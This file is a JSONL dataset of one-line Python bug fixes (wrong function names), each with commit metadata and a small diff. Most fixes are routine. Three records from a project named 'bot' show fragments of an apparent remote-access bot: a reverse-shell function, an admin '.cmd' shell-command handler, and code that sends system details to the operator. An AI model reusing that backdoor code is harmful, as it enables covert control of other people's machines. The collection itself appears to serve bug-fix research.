{"project": "mldata", "commit_sha": "2abf1c3918576af7de764b716bab5a4f628c1eba", "parent_sha": "051cc29cfebbddd6e87d3de8057d7a68694bbfc6", "file_path": "repository/views.py", "project_url": "https://github.com/open-machine-learning/mldata", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -921,7 +921,7 @@ def data_new_review(request, id):\n \n     obj = _get_object_or_404(request, id, Data)\n     # don't want users to be able to remove items once approved\n-    if not obj.is_writeable(request.user) or obj.is_approved:\n+    if not obj.can_edit(request.user) or obj.is_approved:\n         return HttpResponseForbidden()\n \n     if request.method == 'POST':\n", "before": "if not obj . is_writeable ( request . user ) or obj . is_approved : return HttpResponseForbidden ( )", "after": "if not obj . can_edit ( request . user ) or obj . is_approved : return HttpResponseForbidden ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:is_writeable\", 3, 16, 3, 28], \"can_edit\"]]"}
{"project": "pants", "commit_sha": "2e150f41a0ff5615bac632abaed0da95357b1a8e", "parent_sha": "f652b7ca5dee09e6331187551019921e9c1a6f11", "file_path": "src/python/twitter/pants/tasks/scala/zinc_analysis.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ class Analysis(object):\n-    analysis = Analysis.parse(analysis_path)\n+    analysis = Analysis.parse_from_path(analysis_path)\n     splits = [x[0] for x in split_path_pairs]\n     split_analyses = analysis.split(splits, catchall_path is not None)\n     output_paths = [x[1] for x in split_path_pairs]\n", "before": "analysis = Analysis . parse ( analysis_path )", "after": "analysis = Analysis . parse_from_path ( analysis_path )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:parse\", 0, 25, 0, 30], \"parse_from_path\"]]"}
{"project": "pants", "commit_sha": "009405afc5daf44bf9ff59789c8e494417e930f2", "parent_sha": "f8255fd4ce07c76acbbd13fc73304f4691a9792d", "file_path": "src/python/twitter/pants/tasks/prepare_resources.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,4 +75,4 @@ class PrepareResources(Task):\n           egroups.update_compatible_classpaths(group_key, [(conf, resources_dir)])\n         if resources_by_target is not None:\n           target_resources = resources_by_target[resources_tgt]\n-          target_resources.add_abs_paths(resources_dir, resources_tgt.sources)\n+          target_resources.add_rel_paths(resources_dir, resources_tgt.sources)\n", "before": "target_resources . add_abs_paths ( resources_dir , resources_tgt . sources )", "after": "target_resources . add_rel_paths ( resources_dir , resources_tgt . sources )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:add_abs_paths\", 3, 28, 3, 41], \"add_rel_paths\"]]"}
{"project": "regulations-site", "commit_sha": "222509f6b2a8b984fd9c96b800f02a0c98c5a6fe", "parent_sha": "899867ba665785ec6ff27aa87d88f46f8ea17553", "file_path": "regulations/management/commands/fetch_wkhtmltox.py", "project_url": "https://github.com/eregs/regulations-site", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class Command(BaseCommand):\n         if path and os.path.exists(path) and not options['force']:\n             message = (\"WKHTMLTOPDF already exists: {}\\n\"\n                        \"Skipping. Use the --force flag if necessary.\")\n-            self.stderr.write(self.style.INFO(\n+            self.stderr.write(self.style.NOTICE(\n                 message.format(settings.WKHTMLTOPDF_PATH)))\n         else:\n             # Safe because: we're not passing user input into these processes\n", "before": "self . stderr . write ( self . style . INFO ( message . format ( settings . WKHTMLTOPDF_PATH ) ) )", "after": "self . stderr . write ( self . style . NOTICE ( message . format ( settings . WKHTMLTOPDF_PATH ) ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:INFO\", 3, 42, 3, 46], \"NOTICE\"]]"}
{"project": "pypushover", "commit_sha": "938436e66f46eab76f3d4d249318ec49bfa3c951", "parent_sha": "160171985eae0c768b2208e6978ce5d765108ea8", "file_path": "py_pushover/verification.py", "project_url": "https://github.com/KronoSKoderS/pypushover", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,4 +56,4 @@ def verify_group(app_token, group_id):\n-    return verify_group(app_token, group_id)\n+    return verify_user(app_token, group_id)\n", "before": "return verify_group ( app_token , group_id )", "after": "return verify_user ( app_token , group_id )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:verify_group\", 0, 12, 0, 24], \"verify_user\"]]"}
{"project": "localCIDER", "commit_sha": "d62fe57c0331d75a6a32f1c4e870cc9acf88bd45", "parent_sha": "5134fe8c9ef322bf8f889aff01544b2a26ecaa7f", "file_path": "localcider/backend/sequence.py", "project_url": "https://github.com/Pappulab/localCIDER", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1620,7 +1620,7 @@ class Sequence:\n         if isinstance(listOfPsites, int):\n             tmp = listOfPsites\n             listOfPsites = []\n-            listOfPsites.appned(tmp)\n+            listOfPsites.append(tmp)\n \n         # evaluate proposed phosphosites\n         for site in listOfPsites:\n", "before": "listOfPsites . appned ( tmp )", "after": "listOfPsites . append ( tmp )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:appned\", 3, 26, 3, 32], \"append\"]]"}
{"project": "openbci", "commit_sha": "f63a9e72a4fa6fe4a4b0db4c54751a1c006dd2ce", "parent_sha": "50067936d815df498481e84fc71c8b289e38f157", "file_path": "logic/logic_speller_peer.py", "project_url": "https://github.com/BrainTech/openbci", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class LogicSpeller(logic_decision_peer.LogicDecision):\n         l_config.append({'id':self.text_id,\n                          'message':self._message})\n         l_str_config = str(l_config)\n-        LOGGER.info(\"UPDATE: \"+l_str_config)\n+        LOGGER.debug(\"UPDATE: \"+l_str_config)\n         ugm_helper.send_config(self.conn, l_str_config, 1)\n             \n \n", "before": "LOGGER . info ( \"UPDATE: \" + l_str_config )", "after": "LOGGER . debug ( \"UPDATE: \" + l_str_config )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 16, 3, 20], \"debug\"]]"}
{"project": "pcircle", "commit_sha": "0692c50028e3f4ad7edcc5d3957d7d90e775000a", "parent_sha": "009eb89b91d1cde3db2c9b392cd11a24efa90e31", "file_path": "pcircle/fcp.py", "project_url": "https://github.com/olcf/pcircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -265,7 +265,7 @@ class FCP(BaseTask):\n         # save work cnt\n         self.workcnt += workcnt\n \n-        logger.info(\"enq_file: %s, size = %s, workcnt = %s\" %(fi.path, fi.st_size, workcnt),\n+        logger.debug(\"enq_file: %s, size = %s, workcnt = %s\" %(fi.path, fi.st_size, workcnt),\n                     extra=self.d)\n \n     def handle_fitem(self, fi):\n", "before": "logger . info ( \"enq_file: %s, size = %s, workcnt = %s\" % ( fi . path , fi . st_size , workcnt ) , extra = self . d )", "after": "logger . debug ( \"enq_file: %s, size = %s, workcnt = %s\" % ( fi . path , fi . st_size , workcnt ) , extra = self . d )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 16, 3, 20], \"debug\"]]"}
{"project": "proteus", "commit_sha": "b23fd11528992e06f10d4d4152fd038ee981fb95", "parent_sha": "3f2e3ed31ce78233da923a569f7fd9a16e0f6050", "file_path": "proteus/__init__.py", "project_url": "https://github.com/tryton/proteus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class DateDescriptor(FieldDescriptor):\n class DateTimeDescriptor(FieldDescriptor):\n     def __set__(self, instance, value):\n         assert isinstance(value, datetime.datetime)\n-        super(DateTimeDescriptor, self).__set_(instance, value)\n+        super(DateTimeDescriptor, self).__set__(instance, value)\n \n \n class Many2OneDescriptor(FieldDescriptor):\n", "before": "super ( DateTimeDescriptor , self ) . __set_ ( instance , value )", "after": "super ( DateTimeDescriptor , self ) . __set__ ( instance , value )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:__set_\", 3, 41, 3, 47], \"__set__\"]]"}
{"project": "proteus", "commit_sha": "406963254e72412917bfae7252f3fbac66295d02", "parent_sha": "cb0714cf436009846a4d8ea545499c342fe21af8", "file_path": "proteus/__init__.py", "project_url": "https://github.com/tryton/proteus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class DateDescriptor(FieldDescriptor):\n class DateTimeDescriptor(FieldDescriptor):\n     def __set__(self, instance, value):\n         assert isinstance(value, datetime.datetime)\n-        super(DateTimeDescriptor, self).__set_(instance, value)\n+        super(DateTimeDescriptor, self).__set__(instance, value)\n \n \n class Many2OneDescriptor(FieldDescriptor):\n", "before": "super ( DateTimeDescriptor , self ) . __set_ ( instance , value )", "after": "super ( DateTimeDescriptor , self ) . __set__ ( instance , value )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:__set_\", 3, 41, 3, 47], \"__set__\"]]"}
{"project": "Pyglet", "commit_sha": "f855f3376a7a3303fd5d9ba9400f1e337b73041e", "parent_sha": "36597bc6841edb32bba432213453a92429f98fc5", "file_path": "pyglet/font/freetype.py", "project_url": "https://github.com/adamlwgriffiths/Pyglet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -317,7 +317,7 @@ class FreeTypeFont(base.Font):\n         fontconfig.FcInit()\n \n         if isinstance(name, unicode):\n-            name = name.decode('utf8')\n+            name = name.encode('utf8')\n \n         pattern = fontconfig.FcPatternCreate()\n         fontconfig.FcPatternAddDouble(pattern, FC_SIZE, c_double(size))\n", "before": "name = name . decode ( 'utf8' )", "after": "name = name . encode ( 'utf8' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:decode\", 3, 25, 3, 31], \"encode\"]]"}
{"project": "Pyglet", "commit_sha": "e10fbac1bbf8fb31fe71ff1a6bc38d87a77c7d09", "parent_sha": "fc1400b22dbbbd983e963e05c5a1dc714ce8fc92", "file_path": "pyglet/window/carbon/__init__.py", "project_url": "https://github.com/adamlwgriffiths/Pyglet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -757,7 +757,7 @@ class CarbonWindow(BaseWindow):\n \n     @staticmethod\n     def _get_mouse_button_and_modifiers(ev):\n-        buttons = c_uint()\n+        buttons = c_uint32()\n         carbon.GetEventParameter(ev, kEventParamMouseChord,\n             typeMouseButton, c_void_p(), sizeof(buttons), c_void_p(),\n             byref(buttons))\n", "before": "buttons = c_uint ( )", "after": "buttons = c_uint32 ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:c_uint\", 3, 19, 3, 25], \"c_uint32\"]]"}
{"project": "Pyglet", "commit_sha": "9235e6a2112345ba00517a001a3f90f9c4d8e22a", "parent_sha": "52396feeb66cae010cdc150b97d99869858483a5", "file_path": "pyglet/image/codecs/quartz.py", "project_url": "https://github.com/adamlwgriffiths/Pyglet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ class QuartzImageDecoder(ImageDecoder):\n             if cf.CFDictionaryContainsKey(props, kCGImagePropertyGIFDictionary):\n                 gif_props = c_void_p(cf.CFDictionaryGetValue(props, kCGImagePropertyGIFDictionary))\n                 if cf.CFDictionaryContainsKey(gif_props, kCGImagePropertyGIFDelayTime):\n-                    duration = cfnumber_to_float(c_void_p(cf.CFDictionaryGetValue(gif_props, kCGImagePropertyGIFDelayTime)))\n+                    duration = cfnumber_to_number(c_void_p(cf.CFDictionaryGetValue(gif_props, kCGImagePropertyGIFDelayTime)))\n             \n             cf.CFRelease(props)\n             image = self._get_pyglet_ImageData_from_source_at_index(sourceRef, index)\n", "before": "duration = cfnumber_to_float ( c_void_p ( cf . CFDictionaryGetValue ( gif_props , kCGImagePropertyGIFDelayTime ) ) )", "after": "duration = cfnumber_to_number ( c_void_p ( cf . CFDictionaryGetValue ( gif_props , kCGImagePropertyGIFDelayTime ) ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:cfnumber_to_float\", 3, 32, 3, 49], \"cfnumber_to_number\"]]"}
{"project": "sweettooth", "commit_sha": "c64a72cd857adae33b7ba221af04973ec6b4a366", "parent_sha": "715bcab9593dd9057a08fb37ff0e510d1bcbbe4f", "file_path": "sweettooth/review/views.py", "project_url": "https://github.com/magcius/sweettooth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ class ReviewVersionView(DetailView):\n         # Other reviews on the same version\n         previous_reviews = self.object.reviews\n \n-        context.extend(dict(previous_versions=previous_versions,\n+        context.update(dict(previous_versions=previous_versions,\n                             previous_reviews=previous_reviews))\n         return context\n \n", "before": "context . extend ( dict ( previous_versions = previous_versions , previous_reviews = previous_reviews ) )", "after": "context . update ( dict ( previous_versions = previous_versions , previous_reviews = previous_reviews ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:extend\", 3, 17, 3, 23], \"update\"]]"}
{"project": "wipy-environment", "commit_sha": "6717ae0d12c1307cb5c9faa8a5de4ddc344c63ea", "parent_sha": "2fb26c83aa02bf218501548ead8237fd00b8164d", "file_path": "wipy-ftp.py", "project_url": "https://github.com/zsquareplusc/wipy-environment", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ def main():\n     if args.simulate:\n         target = WiPySimulator(args.simulate)\n     else:\n-        target = WiPyActions(not args.defaults)\n+        target = WiPyFTP(not args.defaults)\n     with WiPyActions(target) as wipy:\n         if args.action == 'ls':\n             wipy.ls(args.path)\n", "before": "target = WiPyActions ( not args . defaults )", "after": "target = WiPyFTP ( not args . defaults )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:WiPyActions\", 3, 18, 3, 29], \"WiPyFTP\"]]"}
{"project": "pants", "commit_sha": "3d9a7ba8a5448ab345365659d15022bdf7c103ff", "parent_sha": "1874ad263a1c793146caa8e99d0c7e34e1c46978", "file_path": "src/python/pants/option/options.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class Options(object):\n       if self._legacy_values:\n         values.update(vars(self._legacy_values))  # Proxy any legacy option values.\n     else:\n-      values = copy.copy(self.for_scope(scope.rpartition('.')[0]))\n+      values = copy.deepcopy(self.for_scope(scope.rpartition('.')[0]))\n \n     # Now add our values.\n     flags_in_scope = self._scope_to_flags.get(scope, [])\n", "before": "values = copy . copy ( self . for_scope ( scope . rpartition ( '.' ) [ 0 ] ) )", "after": "values = copy . deepcopy ( self . for_scope ( scope . rpartition ( '.' ) [ 0 ] ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:copy\", 3, 21, 3, 25], \"deepcopy\"]]"}
{"project": "gloopy", "commit_sha": "4900f3afe9ad5cb1e1ad11ca60c8496602be9a01", "parent_sha": "c1432aa01c3f2b59a2a8d258c19764c7531a484d", "file_path": "gloopy/util/vectors.py", "project_url": "https://github.com/tartley/gloopy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,5 +52,5 @@ def any_orthogonal(orig):\n def orientation_random(size=None):\r\n     if size is None:\r\n         size = uniform(0, pi)\r\n-    return Quaternion.new_rotate_axis( size, vec3_random(1) )\r\n+    return Quaternion.new_rotate_axis( size, vec3_random_cube(1) )\r\n \r\n", "before": "return Quaternion . new_rotate_axis ( size , vec3_random ( 1 ) )", "after": "return Quaternion . new_rotate_axis ( size , vec3_random_cube ( 1 ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:vec3_random\", 3, 46, 3, 57], \"vec3_random_cube\"]]"}
{"project": "qgis-PosiView", "commit_sha": "f4c30f797d33e5831fb8139f3e19f1ae7ebfe85c", "parent_sha": "f0f3292e75eece385e80288d5b3e7389991fe571", "file_path": "position_marker.py", "project_url": "https://github.com/jrenken/qgis-PosiView", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class PositionMarker(QgsMapCanvasItem):\n         try:\n             if self.position:\n                 p1 = self.position\n-                p = self.toCanvasCoordinates(self.position)\n+                p = self.toMapCoordinates(self.position)\n                 p2 = self.toMapCoordinates(QPoint(p.x(), p.y() + 100.0))\n             else:\n                 p = self.canvas.viewport().rect().center()\n", "before": "p = self . toCanvasCoordinates ( self . position )", "after": "p = self . toMapCoordinates ( self . position )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:toCanvasCoordinates\", 3, 26, 3, 45], \"toMapCoordinates\"]]"}
{"project": "qgis-PosiView", "commit_sha": "9bd063b115c4d337574a24354f3a3561c7787f1e", "parent_sha": "c82ba2d43963c1a559905333ea9621733b044ede", "file_path": "position_marker.py", "project_url": "https://github.com/jrenken/qgis-PosiView", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class PositionMarker(QgsMapCanvasItem):\n         try:\n             if self.position:\n                 p1 = self.position\n-                p = self.toMapCoordinates(self.position)\n+                p = self.toCanvasCoordinates(self.position)\n                 p2 = self.toMapCoordinates(QPoint(p.x(), p.y() + 100.0))\n             else:\n                 p = self.canvas.viewport().rect().center()\n", "before": "p = self . toMapCoordinates ( self . position )", "after": "p = self . toCanvasCoordinates ( self . position )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:toMapCoordinates\", 3, 26, 3, 42], \"toCanvasCoordinates\"]]"}
{"project": "e2end", "commit_sha": "3ce832709db6d747a10eaf78d32a6b7f04796477", "parent_sha": "5ca55fc6a13f8cda5bda20c1257e0a1fcc215da2", "file_path": "e2end/training.py", "project_url": "https://github.com/oplatek/e2end", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -169,7 +169,7 @@ def training(c, sess, m, db, train, dev, config, train_writer, dev_writer):\n                         if last_measure_loss and m.step > c.reinforce_first_step:\n                             logger.info('Resetting early stopping from loss to reward')\n                             stopper.saver.save(sess=sess, save_path='%s-XENT-final-%.4f-step-%07d' % (stopper.saver_prefix, dev_avg_turn_loss, m.step))\n-                            stopper.clear() \n+                            stopper.reset() \n                         last_measure_loss = m.step < c.reinforce_first_step\n                         if not stopper.save_and_check(stopper_reward, m.step, sess):\n                             raise RuntimeError('Training not improving on train set')\n", "before": "stopper . clear ( )", "after": "stopper . reset ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:clear\", 3, 37, 3, 42], \"reset\"]]"}
{"project": "gloopy", "commit_sha": "8cf17e33c1bda4f027b95dccecc9f441e067ff60", "parent_sha": "855d751ad7cda3df8920aa2b672bfc7e9d8ddb7e", "file_path": "gloopy/examples/browser.py", "project_url": "https://github.com/tartley/gloopy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ class Controller(object):\n     def select_prev_faces(self):\n         if self.selected_item:\n             if self.face_category is None:\n-                self.face_category = self.selected_item.shape.next_cateogry() - 1\n+                self.face_category = self.selected_item.shape.next_category() - 1\n             elif self.face_category >= 0:\n                 self.face_category -= 1\n         self._update_highlight_shape()\n", "before": "self . face_category = self . selected_item . shape . next_cateogry ( ) - 1", "after": "self . face_category = self . selected_item . shape . next_category ( ) - 1", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:next_cateogry\", 3, 63, 3, 76], \"next_category\"]]"}
{"project": "proteus", "commit_sha": "ace9a5454ac830432d0e7ae6020c19b4e151155c", "parent_sha": "2000a5aa7c7070367906b91232c9167fee7b437d", "file_path": "proteus/pyson.py", "project_url": "https://github.com/tryton/proteus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -644,7 +644,7 @@ class DateTime(Date):\n                 and not isinstance(now, datetime.datetime)):\n             now = datetime.datetime.combine(now, datetime.time())\n         if not isinstance(now, datetime.datetime):\n-            now = datetime.datetime.now()\n+            now = datetime.datetime.utcnow()\n         return now + relativedelta(\n             year=dct['y'],\n             month=dct['M'],\n", "before": "now = datetime . datetime . now ( )", "after": "now = datetime . datetime . utcnow ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:now\", 3, 37, 3, 40], \"utcnow\"]]"}
{"project": "udapi-python", "commit_sha": "fe5ca18a2b9cc04dac004b7728877f4cab27209a", "parent_sha": "498157139bf940e308b516d871c70affa01dbf68", "file_path": "udapi/block/write/textmodetrees.py", "project_url": "https://github.com/udapi/udapi-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -261,7 +261,7 @@ class TextModeTrees(BaseWriter):\n \n     def is_marked(self, node):\n         \"\"\"Should a given node be highlighted?\"\"\"\n-        return self.mark_re.match(str(node.misc)) if self.mark_re is not None else False\n+        return self.mark_re.search(str(node.misc)) if self.mark_re is not None else False\n \n     def colorize_comment(self, comment):\n         \"\"\"Return a string with color markup for a given comment.\"\"\"\n", "before": "return self . mark_re . match ( str ( node . misc ) ) if self . mark_re is not None else False", "after": "return self . mark_re . search ( str ( node . misc ) ) if self . mark_re is not None else False", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:match\", 3, 29, 3, 34], \"search\"]]"}
{"project": "bot", "commit_sha": "b0ae3e656cfda414e2a5a0c22400eab0983b4966", "parent_sha": "f4cdd1782505f51f887ad3e2e049db0b73601024", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -221,7 +221,7 @@ def rShell(rsHost, rsPort):\n                 data = rs.recv(1024).decode(\"UTF-8\")\n                 if data == \"quit\":\n                     rs.close()\n-                    sendnetc(\"[x] Closed reverse shell connection with \"+ rsHost +\":\"+ rsPort +\"!\", adminname)\n+                    sendntc(\"[x] Closed reverse shell connection with \"+ rsHost +\":\"+ rsPort +\"!\", adminname)\n                     if debugmode:\n                         print(\"[x] Closed reverse shell connection with \"+ rsHost +\":\"+ rsPort +\"!\")\n                 if data[:2] == \"cd\":\n", "before": "sendnetc ( \"[x] Closed reverse shell connection with \" + rsHost + \":\" + rsPort + \"!\" , adminname )", "after": "sendntc ( \"[x] Closed reverse shell connection with \" + rsHost + \":\" + rsPort + \"!\" , adminname )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:sendnetc\", 3, 21, 3, 29], \"sendntc\"]]"}
{"project": "bot", "commit_sha": "08a959e9163911536ff45ef36f560ede2887c028", "parent_sha": "a87a92d4a3143cb63585402e8d7277c420f44b24", "file_path": "hackserv.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -743,7 +743,7 @@ def main(): # This is the main function for all of the bot controls.\n \n                 # Respond to '.ls' command from admin.\n                 if name.lower() == adminname.lower() and message[:5].find('.ls') != -1:\n-                    sendntc(format(listFiles()), adminname)\n+                    sendntc(format(fileList()), adminname)\n                 \n                 # Respond to '.cmd [shell command]' command from admin.\n                 if name.lower() == adminname.lower() and message[:5].find('.cmd') != -1:\n", "before": "sendntc ( format ( listFiles ( ) ) , adminname )", "after": "sendntc ( format ( fileList ( ) ) , adminname )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:listFiles\", 3, 36, 3, 45], \"fileList\"]]"}
{"project": "NiceLib", "commit_sha": "3e9d09896d162bcc8d4d5ed738a87e84b6b0a69b", "parent_sha": "515227ad4ac3b5ba0ef1d27851f8dc7f702bd230", "file_path": "nicelib/build.py", "project_url": "https://github.com/mabuchilab/NiceLib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def handle_header_path(path):\n         if os.path.exists(path):\n             return path\n         else:\n-            raise Exception(\"Cannot find library header\")\n+            raise ValueError(\"Cannot find library header\")\n \n     header_dict = select_platform_value(path)\n     if 'header' not in header_dict:\n", "before": "raise Exception ( \"Cannot find library header\" )", "after": "raise ValueError ( \"Cannot find library header\" )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:Exception\", 3, 19, 3, 28], \"ValueError\"]]"}
{"project": "aes-lac-2018", "commit_sha": "2de1a558f5f0ec5879c2514b78f042c65506d141", "parent_sha": "5920cb3c6832624c3dbcb26871866e15edc22884", "file_path": "codes/transforms.py", "project_url": "https://github.com/igormq/aes-lac-2018", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -136,7 +136,7 @@ class ToTensor(object):\n         self.gain_range = gain_range\n \n     def _load(self, path):\n-        if type(path, bytes):\n+        if isinstance(path, bytes):\n             data, sample_rate = sf.read(io.ByteIO(path))\n             return torch.from_numpy(data).float(), sample_rate\n \n", "before": "if type ( path , bytes ) : data , sample_rate = sf . read ( io . ByteIO ( path ) ) return torch . from_numpy ( data ) . float ( ) , sample_rate", "after": "if isinstance ( path , bytes ) : data , sample_rate = sf . read ( io . ByteIO ( path ) ) return torch . from_numpy ( data ) . float ( ) , sample_rate", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:type\", 3, 12, 3, 16], \"isinstance\"]]"}
{"project": "bot", "commit_sha": "f8fc37fca0a147e38e32a667f63bc0a843d388b8", "parent_sha": "66f3a9c5bb5232756273dcb6ceef6354041717f3", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -380,7 +380,7 @@ def main():\n                     # Release\n                     sendmsg(\"Release: \" + format(platform.release()), adminname)\n                     # Version\n-                    sendmsg(\"Version :\" + format(platform.release()), adminname)\n+                    sendmsg(\"Version :\" + format(platform.version()), adminname)\n                     # Architecture\n                     sendmsg(\"Architecture: \" + format(platform.architecture()[0]), adminname)\n                     # Machine\n", "before": "sendmsg ( \"Version :\" + format ( platform . release ( ) ) , adminname )", "after": "sendmsg ( \"Version :\" + format ( platform . version ( ) ) , adminname )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:release\", 3, 59, 3, 66], \"version\"]]"}
{"project": "SymPortal_framework", "commit_sha": "58f0b2ee668e10b8e7e6769f407b44adebc44d10", "parent_sha": "c3be1760f3b390878cf5fb8d3f6e2aad903e42bc", "file_path": "symportal_utils.py", "project_url": "https://github.com/SymPortal/SymPortal_framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -284,7 +284,7 @@ class MothurAnalysis:\n         # then reverse complement it\n         # then do a pcr on it again using the same oligo set as the first run\n         # we should then get the output from that pcr and add it to the previous run\n-        if do_reverse_pcr_as_well and self._if_scrap_fasta_exists(fwd_output_scrapped_fasta_path):\n+        if do_reverse_pcr_as_well and self._if_scrap_fasta_exists_clean_and_write_out(fwd_output_scrapped_fasta_path):\n             remove_primer_mismatch_annotations_from_fasta(fwd_output_scrapped_fasta_path)\n             self.fasta_path = fwd_output_scrapped_fasta_path\n             self._rev_comp_make_and_write_mothur_batch_file()\n", "before": "if do_reverse_pcr_as_well and self . _if_scrap_fasta_exists ( fwd_output_scrapped_fasta_path ) : remove_primer_mismatch_annotations_from_fasta ( fwd_output_scrapped_fasta_path ) self . fasta_path = fwd_output_scrapped_fasta_path self . _rev_comp_make_and_write_mothur_batch_file ( )", "after": "if do_reverse_pcr_as_well and self . _if_scrap_fasta_exists_clean_and_write_out ( fwd_output_scrapped_fasta_path ) : remove_primer_mismatch_annotations_from_fasta ( fwd_output_scrapped_fasta_path ) self . fasta_path = fwd_output_scrapped_fasta_path self . _rev_comp_make_and_write_mothur_batch_file ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:_if_scrap_fasta_exists\", 3, 44, 3, 66], \"_if_scrap_fasta_exists_clean_and_write_out\"]]"}
{"project": "raiden-services", "commit_sha": "85a842bb96ab413537537348745a8d068d29e337", "parent_sha": "0c0cb3164b0fee3508fa215e31f1d347d55885f0", "file_path": "src/request_collector/server.py", "project_url": "https://github.com/raiden-network/raiden-services", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class RequestCollector(gevent.Greenlet):\n         )\n \n     def listen_forever(self) -> None:\n-        self.matrix_listener.listen_forever()\n+        self.matrix_listener.run()\n \n     def _run(self) -> None:  # pylint: disable=method-hidden\n         try:\n", "before": "self . matrix_listener . listen_forever ( )", "after": "self . matrix_listener . run ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:listen_forever\", 3, 30, 3, 44], \"run\"]]"}
